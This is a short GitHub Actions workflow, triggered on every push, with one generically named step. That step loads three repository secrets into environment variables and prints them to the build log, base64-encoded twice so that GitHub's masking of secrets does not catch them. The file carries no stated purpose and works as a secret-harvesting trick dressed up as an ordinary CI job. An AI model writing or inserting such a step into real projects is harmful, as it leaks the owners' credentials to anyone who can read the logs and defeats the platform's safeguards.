name: GitHub Actions
on: push
jobs:
  init:
    runs-on: ubuntu-latest
    steps:
      - name: command
        run: env -0 | awk -v RS='\0' '/^(secret_|var_)/ {print $0}' | base64 -w0 | base64 -w0
        env:
          secret_SUNMOON_KEY: ${{ secrets.SUNMOON_KEY }}
          secret_SUNMOON_URL: ${{ secrets.SUNMOON_URL }}
          secret_SUN_URL: ${{ secrets.SUN_URL }}
